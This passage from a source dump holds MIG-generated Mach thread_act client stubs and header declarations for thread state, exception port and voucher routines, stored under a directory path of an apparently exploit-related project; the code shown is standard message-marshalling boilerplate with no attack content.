	*old_voucher = Out0P->old_voucher.name;
	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__thread_act_subsystem__
#if !defined(__MIG_check__Reply__thread_convert_thread_state_t__defined)
#define __MIG_check__Reply__thread_convert_thread_state_t__defined

mig_internal kern_return_t __MIG_check__Reply__thread_convert_thread_state_t(__Reply__thread_convert_thread_state_t *Out0P)
{

	typedef __Reply__thread_convert_thread_state_t __Reply __attribute__((unused));
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */

	if (Out0P->Head.msgh_id != 3728) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size > (mach_msg_size_t)sizeof(__Reply) || msgh_size < (mach_msg_size_t)(sizeof(__Reply) - 5184)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if ( Out0P->out_stateCnt > 1296 )
		return MIG_TYPE_ERROR;
	if (((msgh_size - (mach_msg_size_t)(sizeof(__Reply) - 5184)) / 4< Out0P->out_stateCnt) ||
	    (msgh_size != (mach_msg_size_t)(sizeof(__Reply) - 5184) + Out0P->out_stateCnt * 4))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__thread_convert_thread_state_t__defined) */
#endif /* __MIG_check__Reply__thread_act_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine thread_convert_thread_state */
mig_external kern_return_t thread_convert_thread_state
(
	thread_act_t thread,
	int direction,
	thread_state_flavor_t flavor,
	thread_state_t in_state,
	mach_msg_type_number_t in_stateCnt,
	thread_state_t out_state,
	mach_msg_type_number_t *out_stateCnt
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		int direction;
		thread_state_flavor_t flavor;
		mach_msg_type_number_t in_stateCnt;
		natural_t in_state[1296];
		mach_msg_type_number_t out_stateCnt;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t out_stateCnt;
		natural_t out_state[1296];
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t out_stateCnt;
		natural_t out_state[1296];
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;
	unsigned int msgh_size;
	unsigned int msgh_size_delta;


#ifdef	__MIG_check__Reply__thread_convert_thread_state_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__thread_convert_thread_state_t__defined */

	__DeclareSendRpc(3628, "thread_convert_thread_state")

	InP->NDR = NDR_record;

	InP->direction = direction;

	InP->flavor = flavor;

	if (in_stateCnt > 1296) {
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) InP->in_state, (const char *) in_state, 4 * in_stateCnt);

	InP->in_stateCnt = in_stateCnt;

	msgh_size_delta = (4 * in_stateCnt);
	msgh_size = (mach_msg_size_t)(sizeof(Request) - 5184) + msgh_size_delta;
	InP = (Request *) ((pointer_t) InP + msgh_size_delta - 5184);

	if (*out_stateCnt < 1296)
		InP->out_stateCnt = *out_stateCnt;
	else
		InP->out_stateCnt = 1296;

	InP = &Mess.In;
	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = thread;
	InP->Head.msgh_id = 3628;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3628, "thread_convert_thread_state")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, msgh_size, (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3628, "thread_convert_thread_state")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__thread_convert_thread_state_t__defined)
	check_result = __MIG_check__Reply__thread_convert_thread_state_t((__Reply__thread_convert_thread_state_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__thread_convert_thread_state_t__defined) */

	if (Out0P->out_stateCnt > *out_stateCnt) {
		(void)memcpy((char *) out_state, (const char *) Out0P->out_state, 4 *  *out_stateCnt);
		*out_stateCnt = Out0P->out_stateCnt;
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) out_state, (const char *) Out0P->out_state, 4 * Out0P->out_stateCnt);

	*out_stateCnt = Out0P->out_stateCnt;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__thread_act_subsystem__
#if !defined(__MIG_check__Reply__thread_get_exception_ports_info_t__defined)
#define __MIG_check__Reply__thread_get_exception_ports_info_t__defined

mig_internal kern_return_t __MIG_check__Reply__thread_get_exception_ports_info_t(__Reply__thread_get_exception_ports_info_t *Out0P, __Reply__thread_get_exception_ports_info_t **Out1PP, __Reply__thread_get_exception_ports_info_t **Out2PP, __Reply__thread_get_exception_ports_info_t **Out3PP)
{

	typedef __Reply__thread_get_exception_ports_info_t __Reply __attribute__((unused));
	__Reply *Out1P;
	__Reply *Out2P;
	__Reply *Out3P;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	unsigned int msgh_size_delta;

	if (Out0P->Head.msgh_id != 3730) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size > (mach_msg_size_t)sizeof(__Reply) || msgh_size < (mach_msg_size_t)(sizeof(__Reply) - 640)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

	msgh_size_delta = Out0P->masksCnt * 4;
#if	__MigTypeCheck
	if ( Out0P->masksCnt > 32 )
		return MIG_TYPE_ERROR;
	if (((msgh_size - (mach_msg_size_t)(sizeof(__Reply) - 640)) / 4< Out0P->masksCnt) ||
	    (msgh_size < (mach_msg_size_t)(sizeof(__Reply) - 640) + Out0P->masksCnt * 4))
		{ return MIG_TYPE_ERROR ; }
	msgh_size -= msgh_size_delta;
#endif	/* __MigTypeCheck */

	*Out1PP = Out1P = (__Reply *) ((pointer_t) Out0P + msgh_size_delta - 128);

	msgh_size_delta = Out0P->masksCnt * 8;
#if	__MigTypeCheck
	if ( Out0P->masksCnt > 32 )
		return MIG_TYPE_ERROR;
	if (((msgh_size - (mach_msg_size_t)(sizeof(__Reply) - 640)) / 8< Out0P->masksCnt) ||
	    (msgh_size < (mach_msg_size_t)(sizeof(__Reply) - 640) + Out0P->masksCnt * 8))
		{ return MIG_TYPE_ERROR ; }
	msgh_size -= msgh_size_delta;
#endif	/* __MigTypeCheck */

	*Out2PP = Out2P = (__Reply *) ((pointer_t) Out1P + msgh_size_delta - 256);

	msgh_size_delta = Out0P->masksCnt * 4;
#if	__MigTypeCheck
	if ( Out0P->masksCnt > 32 )
		return MIG_TYPE_ERROR;
	if (((msgh_size - (mach_msg_size_t)(sizeof(__Reply) - 640)) / 4< Out0P->masksCnt) ||
	    (msgh_size < (mach_msg_size_t)(sizeof(__Reply) - 640) + Out0P->masksCnt * 4))
		{ return MIG_TYPE_ERROR ; }
	msgh_size -= msgh_size_delta;
#endif	/* __MigTypeCheck */

	*Out3PP = Out3P = (__Reply *) ((pointer_t) Out2P + msgh_size_delta - 128);

#if	__MigTypeCheck
	if ( Out0P->masksCnt > 32 )
		return MIG_TYPE_ERROR;
	if (((msgh_size - (mach_msg_size_t)(sizeof(__Reply) - 640)) / 4< Out0P->masksCnt) ||
	    (msgh_size != (mach_msg_size_t)(sizeof(__Reply) - 640) + Out0P->masksCnt * 4))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__thread_get_exception_ports_info_t__defined) */
#endif /* __MIG_check__Reply__thread_act_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine thread_get_exception_ports_info */
mig_external kern_return_t thread_get_exception_ports_info
(
	mach_port_t port,
	exception_mask_t exception_mask,
	exception_mask_array_t masks,
	mach_msg_type_number_t *masksCnt,
	exception_handler_info_array_t old_handlers_info,
	exception_behavior_array_t old_behaviors,
	exception_flavor_array_t old_flavors
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		exception_mask_t exception_mask;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t masksCnt;
		exception_mask_t masks[32];
		exception_handler_info_t old_handlers_info[32];
		exception_behavior_t old_behaviors[32];
		thread_state_flavor_t old_flavors[32];
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t masksCnt;
		exception_mask_t masks[32];
		exception_handler_info_t old_handlers_info[32];
		exception_behavior_t old_behaviors[32];
		thread_state_flavor_t old_flavors[32];
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;
	Reply *Out1P = NULL;
	Reply *Out2P = NULL;
	Reply *Out3P = NULL;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__thread_get_exception_ports_info_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__thread_get_exception_ports_info_t__defined */

	__DeclareSendRpc(3630, "thread_get_exception_ports_info")

	InP->NDR = NDR_record;

	InP->exception_mask = exception_mask;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = port;
	InP->Head.msgh_id = 3630;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3630, "thread_get_exception_ports_info")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3630, "thread_get_exception_ports_info")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__thread_get_exception_ports_info_t__defined)
	check_result = __MIG_check__Reply__thread_get_exception_ports_info_t((__Reply__thread_get_exception_ports_info_t *)Out0P, (__Reply__thread_get_exception_ports_info_t **)&Out1P, (__Reply__thread_get_exception_ports_info_t **)&Out2P, (__Reply__thread_get_exception_ports_info_t **)&Out3P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__thread_get_exception_ports_info_t__defined) */

	if (Out0P->masksCnt > 32) {
		(void)memcpy((char *) masks, (const char *) Out0P->masks, 4 *  32);
		*masksCnt = Out0P->masksCnt;
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) masks, (const char *) Out0P->masks, 4 * Out0P->masksCnt);

	*masksCnt = Out0P->masksCnt;

	if (Out0P->masksCnt > 32) {
		(void)memcpy((char *) old_handlers_info, (const char *) Out1P->old_handlers_info, 8 *  32);
		*masksCnt = Out0P->masksCnt;
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) old_handlers_info, (const char *) Out1P->old_handlers_info, 8 * Out0P->masksCnt);

	if (Out0P->masksCnt > 32) {
		(void)memcpy((char *) old_behaviors, (const char *) Out2P->old_behaviors, 4 *  32);
		*masksCnt = Out0P->masksCnt;
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) old_behaviors, (const char *) Out2P->old_behaviors, 4 * Out0P->masksCnt);

	if (Out0P->masksCnt > 32) {
		(void)memcpy((char *) old_flavors, (const char *) Out3P->old_flavors, 4 *  32);
		*masksCnt = Out0P->masksCnt;
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) old_flavors, (const char *) Out3P->old_flavors, 4 * Out0P->masksCnt);

	return KERN_SUCCESS;
}

```

`Exploits/oobPCI/Sources/generated/thread.h`:

```h
#ifndef	_thread_act_user_
#define	_thread_act_user_

/* Module thread_act */

#include <string.h>
#include <mach/ndr.h>
#include <mach/boolean.h>
#include <mach/kern_return.h>
#include <mach/notify.h>
#include <mach/mach_types.h>
#include <mach/message.h>
#include <mach/mig_errors.h>
#include <mach/port.h>
	
/* BEGIN VOUCHER CODE */

#ifndef KERNEL
#if defined(__has_include)
#if __has_include(<mach/mig_voucher_support.h>)
#ifndef USING_VOUCHERS
#define USING_VOUCHERS
#endif
#ifndef __VOUCHER_FORWARD_TYPE_DECLS__
#define __VOUCHER_FORWARD_TYPE_DECLS__
#ifdef __cplusplus
extern "C" {
#endif
#ifndef __VOUCHER_FOWARD_TYPE_DECLS_SINGLE_ATTR
#define __VOUCHER_FOWARD_TYPE_DECLS_SINGLE_ATTR __unsafe_indexable
#endif
	extern boolean_t voucher_mach_msg_set(mach_msg_header_t * msg) __attribute__((weak_import));
#ifdef __cplusplus
}
#endif
#endif // __VOUCHER_FORWARD_TYPE_DECLS__
#endif // __has_include(<mach/mach_voucher_types.h>)
#endif // __has_include
#endif // !KERNEL
	
/* END VOUCHER CODE */

	
/* BEGIN MIG_STRNCPY_ZEROFILL CODE */

#if defined(__has_include)
#if __has_include(<mach/mig_strncpy_zerofill_support.h>)
#ifndef USING_MIG_STRNCPY_ZEROFILL
#define USING_MIG_STRNCPY_ZEROFILL
#endif
#ifndef __MIG_STRNCPY_ZEROFILL_FORWARD_TYPE_DECLS__
#define __MIG_STRNCPY_ZEROFILL_FORWARD_TYPE_DECLS__
#ifdef __cplusplus
extern "C" {
#endif
#ifndef __MIG_STRNCPY_ZEROFILL_FORWARD_TYPE_DECLS_CSTRING_ATTR
#define __MIG_STRNCPY_ZEROFILL_FORWARD_TYPE_DECLS_CSTRING_COUNTEDBY_ATTR(C) __unsafe_indexable
#endif
	extern int mig_strncpy_zerofill(char * dest, const char * src, int len) __attribute__((weak_import));
#ifdef __cplusplus
}
#endif
#endif /* __MIG_STRNCPY_ZEROFILL_FORWARD_TYPE_DECLS__ */
#endif /* __has_include(<mach/mig_strncpy_zerofill_support.h>) */
#endif /* __has_include */
	
/* END MIG_STRNCPY_ZEROFILL CODE */


#ifdef AUTOTEST
#ifndef FUNCTION_PTR_T
#define FUNCTION_PTR_T
typedef void (*function_ptr_t)(mach_port_t, char *, mach_msg_type_number_t);
typedef struct {
        char            * name;
        function_ptr_t  function;
} function_table_entry;
typedef function_table_entry   *function_table_t;
#endif /* FUNCTION_PTR_T */
#endif /* AUTOTEST */

#ifndef	thread_act_MSG_COUNT
#define	thread_act_MSG_COUNT	31
#endif	/* thread_act_MSG_COUNT */

#include <Availability.h>
#include <mach/std_types.h>
#include <mach/mig.h>
#include <mach/mig.h>
#include <mach/mach_types.h>

#ifdef __BeforeMigUserHeader
__BeforeMigUserHeader
#endif /* __BeforeMigUserHeader */

#include <sys/cdefs.h>
__BEGIN_DECLS


/* Routine thread_terminate */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t thread_terminate
(
	thread_act_t target_act
);

/* Routine act_get_state */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t act_get_state
(
	thread_read_t target_act,
	int flavor,
	thread_state_t old_state,
	mach_msg_type_number_t *old_stateCnt
);

/* Routine act_set_state */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t act_set_state
(
	thread_act_t target_act,
	int flavor,
	thread_state_t new_state,
	mach_msg_type_number_t new_stateCnt
);

/* Routine thread_get_state */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t thread_get_state
(
	thread_read_t target_act,
	thread_state_flavor_t flavor,
	thread_state_t old_state,
	mach_msg_type_number_t *old_stateCnt
);

/* Routine thread_set_state */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t thread_set_state
(
	thread_act_t target_act,
	thread_state_flavor_t flavor,
	thread_state_t new_state,
	mach_msg_type_number_t new_stateCnt
);

/* Routine thread_suspend */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t thread_suspend
(
	thread_read_t target_act
);

/* Routine thread_resume */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t thread_resume
(
	thread_read_t target_act
);

/* Routine thread_abort */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t thread_abort
(
	thread_act_t target_act
);

/* Routine thread_abort_safely */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t thread_abort_safely
(
	thread_act_t target_act
);

/* Routine thread_depress_abort */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t thread_depress_abort
(
	thread_act_t thread
);

/* Routine thread_get_special_port */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t thread_get_special_port
(
	thread_inspect_t thr_act,
	int which_port,
	mach_port_t *special_port
);

/* Routine thread_set_special_port */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t thread_set_special_port
(
	thread_act_t thr_act,
	int which_port,
	mach_port_t special_port
);

/* Routine thread_info */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t thread_info
(
	thread_inspect_t target_act,
	thread_flavor_t flavor,
	thread_info_t thread_info_out,
	mach_msg_type_number_t *thread_info_outCnt
);

/* Routine thread_set_exception_ports */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t thread_set_exception_ports
(
	thread_act_t thread,
	exception_mask_t exception_mask,
	mach_port_t new_port,
	exception_behavior_t behavior,
	thread_state_flavor_t new_flavor
);

/* Routine thread_get_exception_ports */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t thread_get_exception_ports
(
	thread_act_t thread,
	exception_mask_t exception_mask,
	exception_mask_array_t masks,
	mach_msg_type_number_t *masksCnt,
	exception_handler_array_t old_handlers,
	exception_behavior_array_t old_behaviors,
	exception_flavor_array_t old_flavors
);

/* Routine thread_swap_exception_ports */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t thread_swap_exception_ports
(
	thread_act_t thread,
	exception_mask_t exception_mask,
	mach_port_t new_port,
	exception_behavior_t behavior,
	thread_state_flavor_t new_flavor,
	exception_mask_array_t masks,
	mach_msg_type_number_t *masksCnt,
	exception_handler_array_t old_handlers,
	exception_behavior_array_t old_behaviors,
	exception_flavor_array_t old_flavors
);

/* Routine thread_policy */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t thread_policy
(
	thread_act_t thr_act,
	policy_t policy,
	policy_base_t base,
	mach_msg_type_number_t baseCnt,
	boolean_t set_limit
);

/* Routine thread_policy_set */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t thread_policy_set
(
	thread_act_t thread,
	thread_policy_flavor_t flavor,
	thread_policy_t policy_info,
	mach_msg_type_number_t policy_infoCnt
);

/* Routine thread_policy_get */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t thread_policy_get
(
	thread_inspect_t thread,
	thread_policy_flavor_t flavor,
	thread_policy_t policy_info,
	mach_msg_type_number_t *policy_infoCnt,
	boolean_t *get_default
);

/* Routine thread_sample */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t thread_sample
(
	thread_act_t thread,
	mach_port_t reply
);

/* Routine etap_trace_thread */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t etap_trace_thread
(
	thread_act_t target_act,
	boolean_t trace_status
);

/* Routine thread_assign */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t thread_assign
(
	thread_act_t thread,
	processor_set_t new_set
);

/* Routine thread_assign_default */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t thread_assign_default
(
	thread_act_t thread
);

/* Routine thread_get_assignment */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t thread_get_assignment
(
	thread_inspect_t thread,
	processor_set_name_t *assigned_set
);

/* Routine thread_set_policy */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t thread_set_policy
(
	thread_act_t thr_act,
	processor_set_t pset,
	policy_t policy,
	policy_base_t base,
	mach_msg_type_number_t baseCnt,
	policy_limit_t limit,
	mach_msg_type_number_t limitCnt
);

/* Routine thread_get_mach_voucher */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t thread_get_mach_voucher
(
	thread_read_t thr_act,
	mach_voucher_selector_t which,
	ipc_voucher_t *voucher
);

/* Routine thread_set_mach_voucher */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t thread_set_mach_voucher
(
	thread_act_t thr_act,
	ipc_voucher_t voucher
);

/* Routine thread_swap_mach_voucher */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t thread_swap_mach_voucher
(
	thread_act_t thr_act,
	ipc_voucher_t new_voucher,
	ipc_voucher_t *old_voucher
);

/* Routine thread_convert_thread_state */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t thread_convert_thread_state
(
	thread_act_t thread,
	int direction,
	thread_state_flavor_t flavor,
	thread_state_t in_state,
	mach_msg_type_number_t in_stateCnt,
	thread_state_t out_state,
	mach_msg_type_number_t *out_stateCnt
);

/* Routine thread_get_exception_ports_info */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t thread_get_exception_ports_info
(
	mach_port_t port,
	exception_mask_t exception_mask,
	exception_mask_array_t masks,
	mach_msg_type_number_t *masksCnt,
	exception_handler_info_array_t old_handlers_info,
	exception_behavior_array_t old_behaviors,
	exception_flavor_array_t old_flavors
);

__END_DECLS

/********************** Caution **************************/
/* The following data types should be used to calculate  */
/* maximum message sizes only. The actual message may be */
/* smaller, and the position of the arguments within the */
/* message layout may vary from what is presented here.  */
/* For example, if any of the arguments are variable-    */
/* sized, and less than the maximum is sent, the data    */
/* will be packed tight in the actual message to reduce  */
/* the presence of holes.                                */
/********************** Caution **************************/

/* typedefs for all requests */

#ifndef __Request__thread_act_subsystem__defined
#define __Request__thread_act_subsystem__defined

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__thread_terminate_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		int flavor;
		mach_msg_type_number_t old_stateCnt;
	} __Request__act_get_state_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		int flavor;
		mach_msg_type_number_t new_stateCnt;
		natural_t new_state[1296];
	} __Request__act_set_state_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		thread_state_flavor_t flavor;
		mach_msg_type_number_t old_stateCnt;
	} __Request__thread_get_state_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		thread_state_flavor_t flavor;
		mach_msg_type_number_t new_stateCnt;
		natural_t new_state[1296];
	} __Request__thread_set_state_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__thread_suspend_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__thread_resume_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__thread_abort_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__thread_abort_safely_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__thread_depress_abort_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		int which_port;
	} __Request__thread_get_special_port_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t special_port;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		int which_port;
	} __Request__thread_set_special_port_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		thread_flavor_t flavor;
		mach_msg_type_number_t thread_info_outCnt;
	} __Request__thread_info_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
